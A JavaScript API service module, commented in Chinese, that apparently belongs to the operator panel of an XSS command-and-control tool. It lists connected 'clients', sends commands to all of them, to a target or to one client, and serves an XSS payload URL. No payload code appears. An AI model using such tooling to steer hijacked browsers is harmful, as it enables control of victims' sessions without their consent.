import { API_BASE_URL, API_ENDPOINTS } from '../constants/api';
import authService from './auth';

class ApiService {
  async request(endpoint, options = {}) {
    const url = `${API_BASE_URL}${endpoint}`;
    const config = {
      headers: {
        'Content-Type': 'application/json',
        ...options.headers,
      },
      ...options,
    };

    // 自动添加认证头
    const token = authService.getToken();
    if (token && !options.skipAuth) {
      config.headers['Authorization'] = `Bearer ${token}`;
    }

    try {
      const response = await fetch(url, config);
      const data = await response.json();
      
      // 处理401认证失败
      if (response.status === 401) {
        authService.logout();
        window.location.href = '/login';
        throw new Error('认证失败，请重新登录');
      }
      
      if (data.status !== 'success') {
        throw new Error(data.message || `请求失败: ${response.status}`);
      }
      
      return data;
    } catch (error) {
      console.error(`API request failed for ${endpoint}:`, error);
      throw error;
    }
  }

  async getAllClients() {
    return this.request(API_ENDPOINTS.CLIENTS);
  }

  async getClient(clientId) {
    return this.request(`${API_ENDPOINTS.CLIENTS}/${clientId}`);
  }

  async sendCommandToAll(command, args = {}) {
    return this.request(API_ENDPOINTS.COMMANDS, {
      method: 'POST',
      body: JSON.stringify({ command, args })
    });
  }

  async sendCommandToTarget(targetId, command, args = {}) {
    return this.request(API_ENDPOINTS.COMMANDS, {
      method: 'POST',
      body: JSON.stringify({ target_id: targetId, command, args })
    });
  }

  async sendCommandToClient(clientId, command, args = {}) {
    return this.request(API_ENDPOINTS.CLIENT_COMMANDS(clientId), {
      method: 'POST',
      body: JSON.stringify({ command, args })
    });
  }

  getPayloadUrl() {
    return `${API_BASE_URL}${API_ENDPOINTS.XSS_PAYLOAD}`;
  }
}

const apiService = new ApiService();
export default apiService;